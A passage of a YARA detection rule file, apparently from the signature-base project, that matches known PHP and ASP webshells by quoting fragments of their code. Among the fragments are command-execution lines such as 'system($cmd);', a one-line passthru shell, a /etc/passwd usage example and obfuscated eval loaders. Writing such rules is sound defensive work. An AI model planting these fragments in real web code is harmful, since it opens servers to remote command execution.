		$s12 = "password = (String)session.getAttribute(\"password\");" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Safe0Ver_2
{
	meta:
		description = "PHP Webshells Github Archive - file safe0ver.php"
		author = "Florian Roth (Nextron Systems)"
		id = "a7fc8c89-f7a1-5958-823a-763dedb3066d"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6026-L6043"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "366639526d92bd38ff7218b8539ac0f154190eb8"
		logic_hash = "ae5de63b79804cf8c99bc5ea0c8862cf05e4085451d2b516cf95565bf32f3876"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "$scriptident = \"$scriptTitle By Evilc0der.com\";" fullword
		$s4 = "while (file_exists(\"$lastdir/newfile$i.txt\"))" fullword
		$s5 = "else { /* <!-- Then it must be a File... --> */" fullword
		$s7 = "$contents .= htmlentities( $line ) ;" fullword
		$s8 = "<br><p><br>Safe Mode ByPAss<p><form method=\"POST\">" fullword
		$s14 = "elseif ( $cmd==\"upload\" ) { /* <!-- Upload File form --> */ " fullword
		$s20 = "/* <!-- End of Actions --> */" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Uploader_2
{
	meta:
		description = "PHP Webshells Github Archive - file Uploader.php"
		author = "Florian Roth (Nextron Systems)"
		id = "c68e15d9-865e-5269-a91c-00619fe76305"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6044-L6055"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "e216c5863a23fde8a449c31660fd413d77cce0b7"
		logic_hash = "c4b915f60a952131caa2c4f5bb2eea85ef25f27cabb8ad36a6bb928433558954"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "move_uploaded_file($userfile, \"entrika.php\"); " fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_Kral_2
{
	meta:
		description = "PHP Webshells Github Archive - file kral.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6056-L6072"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "4cd1d1a2fd448cecc605970e3a89f3c2e5c80dfc"
		logic_hash = "0aded226f4e54c0169b9fbda91458f581ea47f9f8bda61a350b5e6f8b60931f3"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "$adres=gethostbyname($ip);" fullword
		$s3 = "curl_setopt($ch,CURLOPT_POSTFIELDS,\"domain=\".$site);" fullword
		$s4 = "$ekle=\"/index.php?option=com_user&view=reset&layout=confirm\";" fullword
		$s16 = "echo $son.' <br> <font color=\"green\">Access</font><br>';" fullword
		$s17 = "<p>kodlama by <a href=\"mailto:priv8coder@gmail.com\">BLaSTER</a><br /"
		$s20 = "<p><strong>Server listeleyici</strong><br />" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Simple_Backdoor_2_2
{
	meta:
		description = "PHP Webshells Github Archive - file simple-backdoor.php"
		author = "Florian Roth (Nextron Systems)"
		id = "faddd38e-d0c6-5299-9983-53351af1ece5"
		date = "2025-03-29"
		modified = "2025-03-29"
		old_rule_name = "WebShell_simple_backdoor"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6088-L6108"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "edcd5157a68fa00723a506ca86d6cbb8884ef512"
		logic_hash = "655e445e51ec0f1bdce006a72acf3bce95941a349c279c14768760fa9f6f9d76"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->" fullword
		$s1 = "<!--    http://michaeldaw.org   2006    -->" fullword
		$s2 = "Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd" fullword
		$s3 = "        echo \"</pre>\";" fullword
		$s4 = "        $cmd = ($_REQUEST['cmd']);" fullword
		$s5 = "        echo \"<pre>\";" fullword
		$s6 = "if(isset($_REQUEST['cmd'])){" fullword
		$s7 = "        die;" fullword
		$s8 = "        system($cmd);" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Safe_Mode_Bypass_PHP_4_4_2_And_PHP_5_1_2_2_2
{
	meta:
		description = "PHP Webshells Github Archive - file Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2.php"
		author = "Florian Roth (Nextron Systems)"
		id = "a504442f-85f2-55a1-8a07-1e0faccf8bc0"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6109-L6123"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8fdd4e0e87c044177e9e1c97084eb5b18e2f1c25"
		logic_hash = "fbe1f77e00fbc4e58cbad564e2d96c0381765ac799dfdf6cc2580428c68f97a5"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<option value=\"/etc/passwd\">Get /etc/passwd</option>" fullword
		$s3 = "xb5@hotmail.com</FONT></CENTER></B>\");" fullword
		$s4 = "$v = @ini_get(\"open_basedir\");" fullword
		$s6 = "by PHP Emperor<xb5@hotmail.com>" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Ntdaddy_V1_9_2
{
	meta:
		description = "PHP Webshells Github Archive - file NTDaddy v1.9.php"
		author = "Florian Roth (Nextron Systems)"
		id = "a175fd28-5dc2-5827-87f0-4117e889e90e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6124-L6138"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "79519aa407fff72b7510c6a63c877f2e07d7554b"
		logic_hash = "fdf8b4bb4980e588ad5ccee2d047660980d39f38617f887c5762dcdb0b858267"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "|     -obzerve : mr_o@ihateclowns.com |" fullword
		$s6 = "szTempFile = \"C:\\\" & oFileSys.GetTempName( )" fullword
		$s13 = "<form action=ntdaddy.asp method=post>" fullword
		$s17 = "response.write(\"<ERROR: THIS IS NOT A TEXT FILE>\")" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Lamashell_2
{
	meta:
		description = "PHP Webshells Github Archive - file lamashell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "60e39eed-baa2-5999-8560-0a0242ce2608"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6139-L6155"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b71181e0d899b2b07bc55aebb27da6706ea1b560"
		logic_hash = "e58dbd6b9c65a139828890a3fadfad9031580fe189066489d266d37d7078ad98"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "if(($_POST['exe']) == \"Execute\") {" fullword
		$s8 = "$curcmd = $_POST['king'];" fullword
		$s16 = "\"http://www.w3.org/TR/html4/loose.dtd\">" fullword
		$s18 = "<title>lama's'hell v. 3.0</title>" fullword
		$s19 = "_|_  O    _    O  _|_"
		$s20 = "$curcmd = \"ls -lah\";" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Simple_PHP_Backdoor_By_DK_2
{
	meta:
		description = "PHP Webshells Github Archive - file Simple_PHP_backdoor_by_DK.php"
		author = "Florian Roth (Nextron Systems)"
		id = "2c424714-1d2c-5b89-b1bc-a201e37a0a5d"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6156-L6171"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "03f6215548ed370bec0332199be7c4f68105274e"
		logic_hash = "1f65f759ec4045c521085aad84d0aea4dcfcf26eac4357751cf1dde6886d1718"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->" fullword
		$s1 = "<!--    http://michaeldaw.org   2006    -->" fullword
		$s2 = "Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd" fullword
		$s6 = "if(isset($_REQUEST['cmd'])){" fullword
		$s8 = "system($cmd);" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Moroccan_Spamers_Ma_Edition_By_Ghost_2
{
	meta:
		description = "PHP Webshells Github Archive - file Moroccan Spamers Ma-EditioN By GhOsT.php"
		author = "Florian Roth (Nextron Systems)"
		id = "4fa9ce70-d300-55fe-bf98-636f026317ec"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6172-L6185"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "31e5473920a2cc445d246bc5820037d8fe383201"
		logic_hash = "0e3d2d97665b8849d121d63a22baf7393047a814dde3753e395418c1868b59be"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "$content = chunk_split(base64_encode($content)); " fullword
		$s12 = "print \"Sending mail to $to....... \"; " fullword
		$s16 = "if (!$from && !$subject && !$message && !$emaillist){ " fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_C99Madshell_V__2_0_Madnet_Edition_2
{
	meta:
		description = "PHP Webshells Github Archive - file C99madShell v. 2.0 madnet edition.php"
		author = "Florian Roth (Nextron Systems)"
		id = "51db0495-14f3-527e-865b-1405db57ff27"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6186-L6201"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "f99f8228eb12746847f54bad45084f19d1a7e111"
		logic_hash = "7cf825a604783ebc74b1dca53aaff5c886957c562e11276f2acce5ff1f6ab991"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "$md5_pass = \"\"; //If no pass then hash" fullword
		$s1 = "eval(gzinflate(base64_decode('"
		$s2 = "$pass = \"\";  //Pass" fullword
		$s3 = "$login = \"\"; //Login" fullword
		$s4 = "//Authentication" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Cmdasp_Asp_Php_2
{
	meta:
		description = "PHP Webshells Github Archive - file CmdAsp.asp.php.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "184b1731-31a9-5040-aa25-d145e8064758"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6202-L6221"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "cb18e1ac11e37e236e244b96c2af2d313feda696"
		logic_hash = "0fd9c7e83ad9ddf5cf88f1d1573324d9f24ae03a1951446fe11c116fd0cf4932"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "szTempFile = \"C:\\\" & oFileSys.GetTempName( )" fullword
		$s4 = "' Author: Maceo <maceo @ dogmile.com>" fullword
		$s5 = "' -- Use a poor man's pipe ... a temp file -- '" fullword
		$s6 = "' --------------------o0o--------------------" fullword
		$s8 = "' File: CmdAsp.asp" fullword
		$s11 = "<-- CmdAsp.asp -->" fullword
		$s14 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword
		$s16 = "Set oScriptNet = Server.CreateObject(\"WSCRIPT.NETWORK\")" fullword
		$s19 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword

	condition:
		4 of them
}

rule SIGNATURE_BASE_Webshell_NCC_Shell_2
{
	meta:
		description = "PHP Webshells Github Archive - file NCC-Shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "3a2dab3d-faf0-52a5-b114-db402885c618"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6222-L6238"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "64d4495875a809b2730bd93bec2e33902ea80a53"
		logic_hash = "c58edc548b7804be25f6956e9407cc9f8c74dfd8651f601a87ba639284e612d9"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = " if (isset($_FILES['probe']) and ! $_FILES['probe']['error']) {" fullword
		$s1 = "<b>--Coded by Silver" fullword
		$s2 = "<title>Upload - Shell/Datei</title>" fullword
		$s8 = "<a href=\"http://www.n-c-c.6x.to\" target=\"_blank\">-->NCC<--</a></center></b><"
		$s14 = "~|_Team .:National Cracker Crew:._|~<br>" fullword
		$s18 = "printf(\"Sie ist %u Bytes gro" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_README_2
{
	meta:
		description = "PHP Webshells Github Archive - file README.md"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6239-L6251"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "ef2c567b4782c994db48de0168deb29c812f7204"
		logic_hash = "aa8a9be74bbac08518d5ba442aa6fa37d3f1b255df48b49ccb9842f5728a49d5"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Common php webshells. Do not host the file(s) in your server!" fullword
		$s1 = "php-webshells" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Backupsql_2
{
	meta:
		description = "PHP Webshells Github Archive - file backupsql.php"
		author = "Florian Roth (Nextron Systems)"
		id = "15d6e967-1e53-53b4-a2cf-7786452495d4"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6252-L6267"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "863e017545ec8e16a0df5f420f2d708631020dd4"
		logic_hash = "0126bfad6eb3861e8322ac3e11b4fd95bc8b88597d916e66c6646d7d5529c1d5"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "$headers .= \"\\nMIME-Version: 1.0\\n\" .\"Content-Type: multipart/mixed;\\n\" ."
		$s1 = "$ftpconnect = \"ncftpput -u $ftp_user_name -p $ftp_user_pass -d debsender_ftplog"
		$s2 = "* as email attachment, or send to a remote ftp server by" fullword
		$s16 = "* Neagu Mihai<neagumihai@hotmail.com>" fullword
		$s17 = "$from    = \"Neu-Cool@email.com\";  // Who should the emails be sent from?, may "

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_AK_74_Security_Team_Web_Shell_Beta_Version_2
{
	meta:
		description = "PHP Webshells Github Archive - file AK-74 Security Team Web Shell Beta Version.php"
		author = "Florian Roth (Nextron Systems)"
		id = "e93a6ac3-080f-53d3-8368-b9feb509a2ea"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6268-L6281"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "c90b0ba575f432ecc08f8f292f3013b5532fe2c4"
		logic_hash = "4fbf8f5cab8593fd88e5a430b849e61d7d663c13700f459aa516c5b337d5438b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s8 = "- AK-74 Security Team Web Site: www.ak74-team.net" fullword
		$s9 = "<b><font color=#830000>8. X Forwarded For IP - </font></b><font color=#830000>'."
		$s10 = "<b><font color=#83000>Execute system commands!</font></b>" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_Cpanel_2
{
	meta:
		description = "PHP Webshells Github Archive - file cpanel.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6282-L6298"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "433dab17106b175c7cf73f4f094e835d453c0874"
		logic_hash = "e4dc90c52648f1e5b7dc2d77dcb94feb774ec9e3c156c923c54a9e8f537bbf07"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "function ftp_check($host,$user,$pass,$timeout){" fullword
		$s3 = "curl_setopt($ch, CURLOPT_URL, \"http://$host:2082\");" fullword
		$s4 = "[ user@alturks.com ]# info<b><br><font face=tahoma><br>" fullword
		$s12 = "curl_setopt($ch, CURLOPT_FTPLISTONLY, 1);" fullword
		$s13 = "Powerful tool , ftp and cPanel brute forcer , php 5.2.9 safe_mode & open_basedir"
		$s20 = "<br><b>Please enter your USERNAME and PASSWORD to logon<br>" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Accept_Language_2
{
	meta:
		description = "PHP Webshells Github Archive - file accept_language.php"
		author = "Florian Roth (Nextron Systems)"
		id = "343ed2a4-4bed-5e73-8d05-f9573b0147af"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6299-L6310"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "180b13576f8a5407ab3325671b63750adbcb62c9"
		logic_hash = "6d45071722268f5b39b1486a7dce883ecefb2b3c9993357b7b58bd603ff1c40d"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<?php passthru(getenv(\"HTTP_ACCEPT_LANGUAGE\")); echo '<br> by q1w2e3r4'; ?>" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_529_2
{
	meta:
		description = "PHP Webshells Github Archive - file 529.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6311-L6328"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "ba3fb2995528307487dff7d5b624d9f4c94c75d3"
		logic_hash = "f46b84d51077f157c83cd01534dfe7f9cd0d9ef04ad9935ced22d2abc873c171"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<p>More: <a href=\"/\">Md5Cracking.Com Crew</a> " fullword
		$s7 = "href=\"/\" title=\"Securityhouse\">Security House - Shell Center - Edited By Kin"
		$s9 = "echo '<PRE><P>This is exploit from <a " fullword
		$s10 = "This Exploit Was Edited By KingDefacer" fullword
		$s13 = "safe_mode and open_basedir Bypass PHP 5.2.9 " fullword
		$s14 = "$hardstyle = explode(\"/\", $file); " fullword
		$s20 = "while($level--) chdir(\"..\"); " fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_STNC_Webshell_V0_8_2
{
	meta:
		description = "PHP Webshells Github Archive - file STNC WebShell v0.8.php"
		author = "Florian Roth (Nextron Systems)"
		id = "5dc300a2-9965-52e3-a382-b8d327eb7029"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6329-L6342"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "52068c9dff65f1caae8f4c60d0225708612bb8bc"
		logic_hash = "c2067a1b78c441aa05366b612090e0df895c621843038cc9e65beb6719c0cb9a"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "if(isset($_POST[\"action\"])) $action = $_POST[\"action\"];" fullword
		$s8 = "elseif(fe(\"system\")){ob_start();system($s);$r=ob_get_contents();ob_end_clean()"
		$s13 = "{ $pwd = $_POST[\"pwd\"]; $type = filetype($pwd); if($type === \"dir\")chdir($pw"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_Tryag_2
{
	meta:
		description = "PHP Webshells Github Archive - file tryag.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6343-L6358"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "42d837e9ab764e95ed11b8bd6c29699d13fe4c41"
		logic_hash = "2af3bbe8d1940e60843f3f5d40c9c6550e76df21568c374f7a871f73aeefae44"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<title>TrYaG Team - TrYaG.php - Edited By KingDefacer</title>" fullword
		$s3 = "$tabledump = \"DROP TABLE IF EXISTS $table;\\n\"; " fullword
		$s6 = "$string = !empty($_POST['string']) ? $_POST['string'] : 0; " fullword
		$s7 = "$tabledump .= \"CREATE TABLE $table (\\n\"; " fullword
		$s14 = "echo \"<center><div id=logostrip>Edit file: $editfile </div><form action='$REQUE"

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Dc3_Security_Crew_Shell_Priv_2_2
{
	meta:
		description = "PHP Webshells Github Archive - file dC3 Security Crew Shell PRiV.php"
		author = "Florian Roth (Nextron Systems)"
		id = "1d4a95c4-8128-504d-958f-dcc5c68f4975"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6359-L6374"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "9077eb05f4ce19c31c93c2421430dd3068a37f17"
		logic_hash = "52dc0449c205ff9105e2dedc3cb4858f83a2efc7bae579656a26da493dc59500"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "@rmdir($_GET['file']) or die (\"[-]Error deleting dir!\");" fullword
		$s9 = "header(\"Last-Modified: \".date(\"r\",filemtime(__FILE__)));" fullword
		$s13 = "header(\"Content-type: image/gif\");" fullword
		$s14 = "@copy($file,$to) or die (\"[-]Error copying file!\");" fullword
		$s20 = "if (isset($_GET['rename_all'])) {" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Qsd_Php_Backdoor_2
{
	meta:
		description = "PHP Webshells Github Archive - file qsd-php-backdoor.php"
		author = "Florian Roth (Nextron Systems)"
		id = "f8208851-159c-5d0b-91ad-478aeb4fc9fd"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6375-L6389"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "4856bce45fc5b3f938d8125f7cdd35a8bbae380f"
		logic_hash = "3ef7b67cd60370a99fdfa6fd614f71ee314af27c9d983383dde8f03a127a28b3"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "// A robust backdoor script made by Daniel Berliner - http://www.qsdconsulting.c"
		$s2 = "if(isset($_POST[\"newcontent\"]))" fullword
		$s3 = "foreach($parts as $val)//Assemble the path back together" fullword
		$s7 = "$_POST[\"newcontent\"]=urldecode(base64_decode($_POST[\"newcontent\"]));" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_Spygrup_2
{
	meta:
		description = "PHP Webshells Github Archive - file spygrup.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L6390-L6404"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "12f9105332f5dc5d6360a26706cd79afa07fe004"
		logic_hash = "5981f8cc1a98f799b1573cf73297383f995acf1c40f0227ac10302dc4d6fd6cc"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "kingdefacer@msn.com</FONT></CENTER></B>\");" fullword
		$s6 = "if($_POST['root']) $root = $_POST['root'];" fullword
		$s12 = "\".htmlspecialchars($file).\" Bu Dosya zaten Goruntuleniyor<kingdefacer@msn.com>" fullword
		$s18 = "By KingDefacer From Spygrup.org>" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Web_Shell__C_Shankar_2
{
	meta:
		description = "PHP Webshells Github Archive - file Web-shell (c)ShAnKaR.php"
		author = "Florian Roth (Nextron Systems)"
		id = "966f5580-21c5-5ecf-b500-bde3d1ba4494"
		date = "2025-03-29"
